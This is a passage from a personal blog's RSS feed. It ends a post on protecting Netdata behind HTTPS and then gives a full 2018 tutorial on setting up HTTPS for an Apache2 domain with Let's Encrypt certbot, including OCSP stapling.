&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#sudo iptables -I INPUT -p tcp --dport 19999 -j DROP&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;



&lt;p&gt;Now you can go to www.example.com/netdata (as your vhost ServerName is) to access your logs under HTTPS and password protection. &lt;/p&gt;
&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 15 Feb 2018 00:00:00 +0100</pubDate>
        <link>https://bestrocker221.github.io//linux/web/2018/02/15/netdata-ubuntu.html</link>
        <guid isPermaLink="true">https://bestrocker221.github.io//linux/web/2018/02/15/netdata-ubuntu.html</guid>
        
        
        <category>linux</category>
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>Configuring SSL/TLS for a domain on Apache2</title>
        <description>&lt;h1&gt;Configuring a new SSL/TLS domain on Apache2&lt;/h1&gt;

&lt;h2&gt;The &lt;strong&gt;very easy&lt;/strong&gt; way.&lt;/h2&gt;

&lt;h3&gt;With Let's Encrypt certificates&lt;/h3&gt;

&lt;hr /&gt;

&lt;h4&gt;&lt;strong&gt;What do we want:&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;We want to be able to reach &lt;strong&gt;example.com&lt;/strong&gt; under HTTPS protocol on TLS from scratch.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Apache2 vhost&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;In &lt;em&gt;/etc/apache2/sites-available/&lt;/em&gt; copy the default one into &lt;em&gt;example.com.conf&lt;/em&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/example.com.conf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now open example.com.conf and add &quot;ServerName example.com&quot; under &quot;DocumentRoot ... &quot;&lt;/p&gt;

&lt;p&gt;Make sure ssl is enabled in Apache with:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;a2enmod ssl&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now restart &lt;em&gt;apache2&lt;/em&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;systemctl restart apache2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;You can go to &lt;em&gt;http://example.com&lt;/em&gt; to check if it’s working. You should see the standart Apache2 Ubuntu Default Page.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Let's Encrypt CertBot&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Go to &lt;a href=&quot;https://certbot.eff.org/&quot;&gt;&lt;em&gt;https://certbot.eff.org/&lt;/em&gt;&lt;/a&gt; end select your configuration.&lt;/p&gt;

&lt;p&gt;For Ubuntu the commands needed are:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo apt-get update
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo apt-get install software-properties-common
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo add-apt-repository ppa:certbot/certbot
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo apt-get update
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo apt-get install python-certbot-apache &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3&gt;&lt;strong&gt;Certificate Generation (RSA 4096bit)&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;If you want a simple RSA certificate without further security options go straight with:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;certbot run -d example.com --apache --rsa-key-size 4096 --redirect&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If you want also &lt;strong&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/OCSP_stapling&quot;&gt;OCSP Stapling&lt;/a&gt;&lt;/strong&gt; then go with this command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;certbot run -d example.com --apache --rsa-key-size 4096 --redirect 
                    --must-staple --uir --staple-ocsp&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The –redirect will automatically configure apache to redirect users from HTTP to HTTPS. At the end, certbot has created and acrivated a new virtual host for the https domain called &lt;strong&gt;example.com-le-sll.conf&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Restart &lt;em&gt;apache2&lt;/em&gt; the last time.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DONE!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now you can go to &lt;em&gt;http://example.com&lt;/em&gt; and apache will redirect you to the https version.&lt;/p&gt;
</description>
        <pubDate>Thu, 15 Feb 2018 00:00:00 +0100</pubDate>
        <link>https://bestrocker221.github.io//linux/web/2018/02/15/apache-ssl-tls-domain.html</link>
        <guid isPermaLink="true">https://bestrocker221.github.io//linux/web/2018/02/15/apache-ssl-tls-domain.html</guid>
        
        
        <category>linux</category>
        
        <category>web</category>
        
      </item>
    
  </channel>
</rss>
